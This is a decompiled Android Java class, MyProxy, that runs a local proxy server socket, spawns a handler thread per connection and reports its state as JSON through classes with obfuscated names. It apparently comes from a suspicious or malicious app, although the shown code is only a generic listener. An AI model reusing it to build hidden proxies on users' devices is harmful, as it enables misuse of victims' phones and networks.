/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.util.Log
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.util.Log;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import linker.resourcer.encoder.RequestHandler;
import linker.resourcer.encoder.etkmbyodxlwuglfdj;
import linker.resourcer.encoder.maagohqzehyoivaxlfkohrpeu;
import org.json.JSONObject;

public class MyProxy {
    private boolean running = true;
    private ServerSocket serverSocket;

    public MyProxy(int n) throws IOException {
        this.serverSocket = new ServerSocket(n);
    }

    private void proxystate(Context context, String string2) {
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("ctype", (Object)"state");
            jSONObject.put("pxstate", (Object)string2);
            etkmbyodxlwuglfdj.instance(context).ProxyMsg(context, jSONObject);
        }
        catch (Exception exception) {
            maagohqzehyoivaxlfkohrpeu.Error("logserver", "Error " + exception.getMessage());
            exception.printStackTrace();
        }
    }

    public void start(Context context) {
        while (this.running) {
            try {
                Socket socket = this.serverSocket.accept();
                this.proxystate(context, "Active");
                RequestHandler requestHandler = new RequestHandler(socket, context);
                Thread thread = new Thread(requestHandler);
                thread.start();
            }
            catch (IOException iOException) {
                Log.e((String)"Proxy", (String)"Error accepting client connection", (Throwable)iOException);
            }
        }
    }

    public void stop() {
        this.running = false;
        try {
            this.serverSocket.close();
        }
        catch (IOException iOException) {
            Log.e((String)"Proxy", (String)"Error closing server socket", (Throwable)iOException);
        }
    }
}

